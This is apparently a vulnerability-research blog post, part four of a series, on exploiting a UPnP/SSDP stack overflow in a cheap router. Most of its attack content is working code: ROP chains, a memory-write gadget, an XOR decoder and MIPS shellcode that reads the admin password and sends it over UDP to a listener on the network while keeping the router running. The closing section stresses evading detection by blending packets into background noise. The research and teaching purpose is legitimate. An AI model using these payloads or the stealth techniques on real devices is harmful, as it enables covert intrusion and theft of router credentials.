---
published: true
title : "🐛️ Analysing a Dirt-cheap Router [4]: Process Continuation + Shellcode"
toc: true
toc_sticky: true
categories:
  - VR
tags:
  - Exploitation
  - MIPS
  - Shellcode
tagline: "We managed to extract the admin password using ROP, but (spoiler alert) it completely crashes the router - can we get the admin password out using a different technique and keep the router running?"
excerpt : "ROP works, but can we do anything interesting without crashing the router?"
header:
  teaser: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_image: /assets/images/analysing_a_dirt_cheap_router/mcu.jpg
  overlay_filter: 0.4
  #caption: "Photo credit: [**Unsplash**](https://unsplash.com)"
---

# Fixing the crash

Our ROP payloads work, but every single one results in the router becoming unusable - not very covert. Before we can do anything interesting, we need to find a way of executing our code without crashing the router. Lets try and come up with a small PoC to prove that we aren't wasting our time.

## Working out Overwritten Values

If you've been paying attention during the previous couple of blogs, you will know that we overwrite registers *$s0-3* and *$ra* when we exploit the stack-based buffer overflow. We need the program to believe that everything is working as usual, which means having the correct values in the correct locations - we need to figure out these values. 

![this_is_fine_meme.jpg](/assets/images/analysing_a_dirt_cheap_router_part_4/this_is_fine_meme.jpg)

If we could attach a debugger to the router then life would be much easier, but unfortunately we can't do this easily. However, we do have the dump of the registers and stack when a crash does occur.

Lets start by sending random values for the *$s0* value we overwrite and hope that this causes a crash - fortunately it does, and it prints out the following crash dump:

![3_bytes_expected.png](/assets/images/analysing_a_dirt_cheap_router_part_4/3_bytes_expected.png)

As you can see from the crash dump, we have determined the expected values for *$s1-3* and *$ra* - however, we still need to work out *$s0*. Fortunately, we can just repeat the same trick on a smaller scale by overwriting a single bit of *$s0* - giving us 3 bytes and 7 bits of *$s0*:

![3_bytes_7_bits_expected.png](/assets/images/analysing_a_dirt_cheap_router_part_4/3_bytes_7_bits_expected.png)

The last bit has 2 possible values, so we can just try both of these values for *$s0* in the overflow until there is not a crash - the last byte was determined to be *0x0* which makes sense because allignment.

So, here are the values we need to get back into the respective registers to continue execution:

| Register | Value |
|-|-|
| *$s0* | *0x802c0000* |
| *$s1* | *0x8025d500* |
| *$s2* | *0x802C5268* |
| *$s3* | *0x802ab9f4* |
| *$ra* | *0x801888e0* |

The last thing to mention about these addresses is that they contain 0's, which we obviously cannot send as this is a *strcpy* overflow. However, as long as *$s0* and *$s1* are alligned on the 4-byte boundary, they can be basically any value and nothing seems to break, which is good for us! I changed all of the 0's to 4's and tested with these values and there was no crash, nice.

## Reversing Stack Layout

We need to worry about more than just the registers, if we overflow a massive chunk of the stack, and destroy loads of previous stack frames in the process, it won't be very fun to clean up. We need to make sure the stack is in a recoverable state, and that the stack pointer is pointing to a valid location. 

The stack dump in the crash isn't useful as it starts at the current *$sp* and grows upwards, meaning the stack frame of the previous function call is not displayed.

To make reversing the stack layout easier, I found a *hexdump* function that hexdumps memory using a passed location and length, then crafted a ROP chain that would use this to print the stack to the debug shell:

```
-python
chain += p32(0x802ab980) # s0 (address to read)
chain += p32(0xdecea5ed) # s1
chain += p32(0xdecea5ed) # s2
chain += p32(0xdecea5ed) # s3
chain += p32(0xb0228 + base_address) # ra

# Move address into a0
# 0x000b0228: move $a0, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 8;
chain += p32(0xdecea5ed) # s0
chain += p32(0x71b68 + base_address) # ra

# 0x00071b68: addiu $a1, $zero, 0x8bf; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
chain += b'b' * 4
chain += p32(0x57864 + base_address) # ra

# Load and call hexdump
# 0x00057864: lw $v0, ($sp); lw $ra, 0xc($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(0x8019966c) # v0 - hexdump address
chain += b'b' * 8
chain += p32(0x15114 + base_address) # ra

# 0x00015114: jalr $v0; nop; lw $ra, 4($sp); move $v0, $zero; jr $ra; addiu $sp, $sp, 8;
chain += b'b' * 4
chain += p32(0xdeadbeef) # ra
```

Unfortunately, the stack is so small that the chain overwrote most of the stack frames below the overflowed functions stack frame, so it didn't end up being very useful! It isn't completely useless however, as we can use it to debug shellcode later.

As there isn't a nice way of reading out the stack, we can use the overwritten *$ra* value (*0x801888e0*) to manually work out the layout. If we go to this address in Ghidra, we can work out the size of the stack frame of the function by looking at the first and last instructions where it adjusts the stack pointer. Here is that function:

![m_search_overflow_caller.png](/assets/images/analysing_a_dirt_cheap_router_part_4/m_search_overflow_caller.png)

Looking at the **addiu $sp, $sp, 0x?** instructions, we can see the size of the stack frame is *0x10* bytes. If we could get a gadget that only uses this *0x10* bytes of the stack, it should be pretty simple to recover from. If need be, we can do some more reversing to get a bit more room on the stack, but hopefully that won't be necessary!

## Writing Memory Without a Crash

It would be ideal if we could perform a memory write without causing a crash, as we could then write as much memory as we want. I started by finding gadgets that use values in *$s0-3* registers to write memory (as we control those), and also used no more than *0x10* bytes on the stack. Luckily I was able to find one:

```
-mipsasm
sw $s0, ($s1); 
lw $ra, 0xc($sp); 
move $v0, $s0; 
lw $s2, 8($sp); 
lw $s1, 4($sp);
lw $s0, ($sp); 
jr $ra; 
addiu $sp, $sp, 0x10;
```

We just need to put our memory location in *$s0*, the 4-byte value we want to write into *$s1*, and the expected value for *$s3* that we determined earlier in *$s3* (we don't care about *$s2* in the initial overflow). We can then put the expected *$s0-2* values on the stack. For the value of *$ra*, I decided to set it to *0x801888e8* as a complete guess as it is the last set of instructions that is executed in the caller function, and this worked?  At the time, I wasn't 100% sure how this worked, as the start of the caller function subtracts *0x10* from the *$sp*, our gadget then adds *0x10* and jumps to the epilogue of the function which also increments the stack pointer by *0x10*? So why does this work?

![why_work.jpg](/assets/images/analysing_a_dirt_cheap_router_part_4/why_work.jpg)

I did a bit more digging, and I think I just got very lucky. By reversing the struct for UPnP M-SEARCH functionality in Ghidra, I found the function that was accessing the list of handler functions for various components of the packet and calling them - eventually calling the main body handler function which calls the function with the overflow. Concidentally, this function also uses a stack frame of size *0x10*, so we are essentially returning to the caller of this function as we skip a load of *$ra* - allowing execution to continue. It's pretty confusing, but we are essentially 'skipping' one of the previous stack frames on the stack, and luckily the remainder of the function who's stack frame we skip over doesn't do anything important! Let me explain in more detail step-by-step:

*Normal execution:*
- At the end of the overflow function, the *$ra* is loaded from the overflow stack frame and the stack pointer is decreased by *0x98*
- Now in the caller 1 function, *$ra* is loaded from the caller 1 stack frame, *$sp* decreased by *0x10*
- Now in the caller 2 function, *$ra* is loaded from the caller 2 stack frame, *$sp* decreased by *0x10*
- Now in the caller 3 function, *$ra* is loaded from the caller 3 stack frame, *$sp* decreased by *0x20*

*Somehow working execution:*
- At the end of the overflow function, the *$ra* is loaded from the overflow stack frame (which has been overwritten to point to the address of our gadget) and the stack pointer is decreased by *0x98*
- Now in the gadget, *$ra* is loaded from the caller 1 stack frame, *$sp* is decreased by *0x10*
- Now in the caller 1 function, *ra* is loaded from the **caller 2 stack frame** which points to caller 3, *$sp* is decreased by *0x10*
- Caller 2 function has been skipped over
- Now in the caller 3 function, *$ra* is loaded from the caller 3 stack frame, *$sp* decreased by *0x20*

Here is the PoC code that demonstrates how memory can be written with this gadget:

```
-python
address_to_write = 0x801d3754
value_to_write = 0x62626262

# Add the strings to the sX registers, and set the ra to first gadget
chain += p32(value_to_write) # s0
chain += p32(address_to_write) # s1
chain += p32(0x802C5268) # s2
chain += p32(0x802ab9f4) # s3
chain += p32(0x8013be14) # ra

# 0x8013be14: sw $s0, ($s1); lw $ra, 0xc($sp); move $v0, $s0; lw $s2, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
chain += p32(0x802c0404) # s0
chain += p32(0x8025d504) # s1
chain += p32(0x802C5268) # s2
chain += p32(0x801888e8) # ra
```

We can prove that this worked by using the memory read functionality we created earlier, so it wasn't completely useless!

![write_test.png](/assets/images/analysing_a_dirt_cheap_router_part_4/write_test.png)

# What is Shellcode?

Shellcode is a series of instructions written in assembly, its called shellcode as it is usually used to get a shell on the target. If you can inject a specially crafted shellcode into the memory of a vulnerable program (and there are no mitigations), it grants unauthorized control over the system. Shellcode is the go-to method of exploiting buffer overflow vulnerabilities - shellcode is written to memory, and the program counter is set to the start of the shellcode to execute it.

Shellcode has been a thing for a very long time, so there are plenty of examples on the Internet that perform various actions, such as popping a reverse TCP shell or causing a system reboot (obviously depending on the architecture). There are several ways to get shellcode, you can use something like *msfvenom* to generate a shellcode to perform an action (and also adjust it based on limitations such as badchars), or you can write it by hand.

![shellcode.jpg](/assets/images/analysing_a_dirt_cheap_router_part_4/shellcode.jpg)

# Shellcode on MIPS

When exploiting overflows on MIPS, you need to consider a couple of quirks: the branch delay slot (I explained what this is in the previous blog), and for self-modifying shellcode, the data and instruction caches.

## Caches on MIPS

In the context of computer architecture, a cache is just a small region of very fast memory that contains data. MIPS uses a couple of caches to help speed up memory accesses, namely the data and instruction caches. There is a great blog post called "Why is My Perfectly Good Shellcode Not Working?: Cache Coherency on MIPS and ARM" that does a great job of going in-depth on these caches and some of the issues they cause. It seems the only way to access this blog is to use Wayback Machine with [this link](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm).

![caches.png](/assets/images/analysing_a_dirt_cheap_router_part_4/caches.png)

### Instruction Cache

The instruction cache (a.k.a I-cache), is a fast memory that saves previously accessed instructions. Its goal is to increase overall processor performance by lowering the time necessary to fetch instructions from memory. The I-cache stores a copy of frequently executed instructions, allowing quick access without having to fetch the value from slow main memory.

The CPU first checks the instruction cache when it needs to execute an instruction. If the instruction is discovered in the cache (a cache hit), it is fetched from there directly - this is substantially faster than accessing main memory. In the event of a cache miss (the instruction is not located in the cache), the processor is forced to retrieve it from memory.

The instruction cache functions on the locality principle, taking advantage of the fact that instructions have temporal and spacial locality. Temporal locality indicates that recently accessed instructions are likely to be accessed again soon, but spatial locality indicates that instructions in memory that are close to each other are likely to be accessed together.

### Data Cache

The data cache (a.k.a D-cache), is a high-speed memory that stores recently accessed data values. Its goal is to enhance data access efficiency by minimising the time necessary to read or write data to/from main memory. The D-cache stores a copy of frequently used data items, such as variables and arrays, so that the processor can retrieve them quickly without touching slower main memory. It operates in pretty much the exacty same way as the instruction cache.

Similar to the instruction cache, the data cache also exploits the principle of locality. It takes advantage of temporal locality by storing recently accessed data items and spatial locality by fetching data in larger chunks (cache lines) rather than accessing individual bytes.

### Why are they annoying?

The main reason the instruction cache is annoying is because it makes the use of self-modifying shellcode a little bit more difficult. As mentioned earlier, nearby instructions are loaded into the instruction cache and executed from there (as it is quicker). If we modify the instructions in memory with our shellcode by decoding it, for example, the processor will continue to fetch the instructions from the instruction cache which are not decoded. 

To fix this issue, the instruction cache must be flushed. This would remove the old instructions from the cache, forcing the new instructions to be loaded back into the cache from memory and executed. 

The following paragraph is lifted from "Why is My Perfectly Good Shellcode Not Working?: Cache Coherency on MIPS and ARM", and it does a great job of explaining why the data cache can also be a pain:

> When the TP-Link’s MIPS processor wrote our shellcode to the executable heap it only wrote the shellcode to the data cache, not to main memory. Modified areas in the data cache are marked for later syncing with main memory. However, although the heap was marked executable, the processor didn’t automatically recognize our bytes as code and never updated the instruction cache with our new values. What’s more, even if the instruction cache synced with main memory before our code ran, it still wouldn’t have received our values because they had not yet been written from the data cache to main memory. Before our shellcode could run, it needed to move from the data cache to the instruction cache, by way of main memory, and that wasn't happening.

So, we will need to carefully consider the behaviour of these caches when writing our shellcode.

# Writing the Shellcode

Now that we are in a position to use the write gadget to write to an area of memory, we can start writing our shellcode. The plan is to essentially perform the same action as the final ROP payload seen in the previous blog - extracting the admin password of the router and sending it to a listener on a device connected to the network.

## Decoder Shellcode

Remember how we cannot send 0's to the router? Well MIPS encodes the *$a0* register (first argument) as 0 when assembled, which means we would not be able to modify the *$a0* register (which is pretty important!) in our shellcode.

To overcome this, we can encode the main shellcode with XOR instructions and some fixed key (I used **0xf6f6f6f6**). This can then be decoded with a decoder shellcode at the start of the payload that will decode the main shellcode which we can then run. We are then able to execute instructions that have 0's in their machine code!

As we have control of the *$s0-3* registers, we can pass in some useful variables in those for the shellcode to use. This saves us some instructions as we don't need to manually load in addresses. Here is the simple decoder I wrote:

```
-mipsasm
  xor $s2, $s2, $s3;      /* decode length in s2 with key in s3 */
loop:
  lw $s0, 0x1010($s1);    /* load the shellcode value to decode */
  xor $s0, $s0, $s3;      /* decode the loaded value with key in s3 */
  sw $s0, 0x1010($s1)     /* save value to location it was got from */
  addiu $s2, $s2, -0x4;   /* decrease s2 by 4 so we can check if all decoded */
  addiu $s1, $s1, 0x108;  /* decrease decoding address by 4 (along with branch delay) */
  bgtz $s2, loop;         /* loop if there is still more to decode */
  addiu $s1, $s1, -0x104; /* branch delay slot (happens before branch taken) */
```

The input values are as follows:

| Register | Value |
| - | - |
| *$s0* | Not used |
| *$s1* | Address of encoded shellcode |
| *$s2* | Encoded length of encoded shellcode |
| *$s3* | XOR key (I used **0xf6f6f6f6**) |

As this is not encoded, some modifications had to be made to remove any 0's in the generated machine code. The first is that an offset of *0x1010* had to be used in a couple of places, as the offset makes up 2 bytes, setting it to *0x1010* prevents the offset bytes from being 0. The second is how *$s1* is increased by 4, again, the immediate value we are adding is 2 bytes, so adding 4 will result in *0x00 0x04* being in our payload. Therefore, the first modifying addition has to be greater than *0x100*, the second doesn't matter as much as it is negative, but it must result in *$s1* being increased by 4.

## Fix Shellcode

Now that we know the values required in the overwritten registers, we can create a fix shellcode that fills the registers with these values after we have run our main shellcode:

```
-mipsasm
xor $v0, $s3, $s3;      /* fix v0 (in branch delay slot) */
lui $t0, 0x802c;
ori $s0, $t0, 0x0404;   /* fix s0 (0x802c0404) */
lui $s1, 0x8025;
ori $s1, $s1, 0x0504;   /* fix s1 (0x8025d504) */
ori $s2, $t0, 0x5268;   /* fix s2 (0x802C5268) */
lui $s3, 0x802a;        
ori $s3, $s3, 0xb9f4;   /* fix s3 (0x802ab9f4) */
addiu $sp, $sp, 0xfff;  /* Fix up stack once shellcode done */
j 0x801888e0;
addiu $sp, $sp, -0xfef;
```

As you can see, we are just loading the values into the corresponding registers with a series of **lui** and **ori** instructions. We also set *$v0* to 0 as otherwise it crashes due to a branch in one of the handlers. We also use the same return value and stack pointer modification as earlier - if it ain't broke don't fix it!

## Putting Everything Together

To test everything is working as expected, I put together a simple example that simply prints a string in memory to the debug console. 

### Flushing Caches

The standard approach when using a decoder is to decode the main shellcode, and then jump to it straight away. As the shellcode is self-modifying, the instruction and data caches I mentioned earlier must be flushed. Otherwise the memory that has been modified will remain in the data cache, and not the actual memory - so when you try and execute it, you will hit the encoded version. 

A standard way to do this is to call *sleep* as this flushes the caches. You could also add an infinite loop to the start of the main shellcode that is modified by the decoder to become a **noop** instruction, this way you get stuck in the loop until the caches have been flushed. In the end, I decided the best way to do this is to first jump to the decoder, wait a period of time to allow the caches to flush on their own accord, then send another jump gadget to the start of the decoded main shellcode.

![flush.jpg](/assets/images/analysing_a_dirt_cheap_router_part_4/flush.jpg)

To achieve this method, I had to modify the 'fix' shellcode to contain no 0's, and appended this to the end of the decoder. This means the decoder can run, decode the main shellcode, then fix everything with the fix shellcode and continue execution. We can also re-use the fix shellcode after we run the main decoded shellcode.

### *printf* Payload

Now that we have a method to flush the caches, we can get to writing the VERY simple *printf* shellcode. This is made even easier as we can now pass values in registers *$s0-3*:

| Register | Value |
| - | - |
| $s1 | Address of string to print |
| $s2 | Address of format string |
| $s3 | *printf* address |

And here is the shellcode we will use:

```
-mipsasm
move $a0, $s2;
move $a1, $s1;
jalr $s3;           /* call printf */
nop;
j 0x802C3638;       /* address of fix shellcode */
xor $v0, $s3, $s3;  /* set v0 to 0 */
```

### Method

The method we will use to write and call the shellcode is as follows:
- Construct our full decoder shellcode (decoder + fix)
- Encode the main shellcode using the XOR key (**0xf6f6f6f6**)
- Append the encoded payload to the decoder (keeping track of the offset/addresses)
- Exploit the overflow and use the write gadget multiple times (**payload length / 4**) to write the payload to memory
- Exploit the overflow and set the return address to be the address of the decoder, this will decode the main shellcode
- Exploit the overflow again and set the return address to be the address of the now-decoded payload
- 💸💸💸💸💸💸

![printf.png](/assets/images/analysing_a_dirt_cheap_router_part_4/printf.png)

## Full Admin Password Exploit Shellcode

Now we have tested the decoder and the fix shellcodes, we can move on to creating a larger payload.

### Breakdown

The input parameters are as follows:

| Register | Value |
| - | - |
| *$s0* | Address of *strlen* function |
| *$s1* | Address of *0x1010200* (config ID of admin password - refer to part 3) |
| *$s2* | Address we will use to store the admin password |
| *$s3* | Address of *socket* function |

- First, we call **config_get(0x1010200, buffer)**, remember the the instruction after **jalr** is taken before the jump takes place (thanks branch delay slot):

```
-mipsasm
lw $a0, ($s1);      /* s1 contains address of 0x1010200 */
lui $v0, 0x8000;
or $v0, 0x89e4;
jalr $v0;           /* config_get(0x1010200 (*0x80236c4c), pwd_buffer (0x801d3754)) */
move $a1, $s2;      /* s2 contains pwd buffer address */
```

- Next, call **strlen** on the buffer containing the admin password:

```
-mipsasm
jalr $s0;           /* len = strlen(pwd_buffer (0x801d3754)) */
move $a0, $s2;      /* s2 contains pwd buffer address */
```

- Store the length in *$s0*, and construct the *sockaddr* containing the port and IP we will use:

```
-mipsasm
move $s0, $v0;      /* v0 contains length of password */
/* create sockaddr stuff and put into t0 */
lui $v0, 0x800f;
or $v0, $v0, 0x9528;
lw $v0, ($v0);      /* load value of hardcoded_afinet into v0 */
lui $t0, 0x802a;
or $s1, $t0, 0xbf10;
sw $v0, ($s1);      /* save hardcoded_afinet value to address of sockaddr */
addiu $t0, $s1, 0x4;
lui $v0, 0x02bc;
or $v0, $v0, 0xa8c0;
sw $v0, ($t0);      /* save hardcoded IP address to sockaddr + 4 */
```

- Call **socket(2, 2, 0)** to create the socket and get the *sockfd*:

```
-mipsasm
addiu $a0, $zero, 2;
addiu $a1, $zero, 2;
jalr $s3;           /* socket(2, 2, 0) - s3 contains address of socket()*/
move $a2, $zero;
```

- Move all of the arguments to the correct registers, and call **sendto**:

```
-mipsasm
move $a0, $v0;      /* v0 contains sockfd_address */
move $a1, $s2;      /* s2 contains pwd buffer address */
move $a2, $s0;      /* s0 contains pwd length */
move $a3, $zero;
move $t0, $s1;      /* s1 contains the address of sockaddr */
lui $v0, 0x8012;
or $v0, $v0, 0x8bc4;
jalr $v0;           /* sendto(sockfd_addr (0x802ab9b0), pwd_buffer (0x801d3754), len, 0, sockaddr_addr (0x802ab980), 0x20); */
addiu $t1, $zero, 0x20;
```

- Finally, jump to the address of the fix shellcode to load the expected register values and adjust the stack pointer:

```
-mipsasm
j 0x802C3638;   /* fix address */
xor $v0, $s3, $s3;
```

As you can see, it is much easier to follow than the ROP chain in part 3!

### Does it work?

After sending the huge amount of SSDP requests to write the shellcode, decode it, and then run it, it works! I did initially have some issues with random crashes, but this was fixed by adding delays between the packets being sent, and also attempting to write each memory address twice. This was probably due to the caches being annoying as per usual.

Here are some of the packets that are seen when sending the payload in wireshark, you can see the password-containing packet be sent from the router at the end:

![packets.png](/assets/images/analysing_a_dirt_cheap_router_part_4/packets.png)

And here are the contents of the UDP packet containing the password:

![packet_contents.png](/assets/images/analysing_a_dirt_cheap_router_part_4/packet_contents.png)

We can see the password is *th35he11c0d3w0rk5*!

![anonymous_cat.jpg](/assets/images/analysing_a_dirt_cheap_router_part_4/anonymous_cat.jpg)

# Conclusion

This method seems to be a much better solution than using ROP, as unless someone is monitoring traffic on the network, they would have no idea that we have executed shellcode on their device as everything is still running as normal. However, we do have to send a very large number of packets to write larger shellcodes into memory, but this could also be done over time to blend in to the background noise.

The only issue with the current approach is that we cannot write to addresses containing 0's as values after 0 get cut off our overflow string, hence no control over *$ra*. Maybe for the grand finale of this project I'll overcome this issue and write some larger shellcodes that do some even more interesting things, we'll see!

Thanks for reading, the [repo for this project](https://github.com/luke-r-m/Chaneve-Router-Analysis) contains everything discussed in all blogs in this series - feel free to check it out!
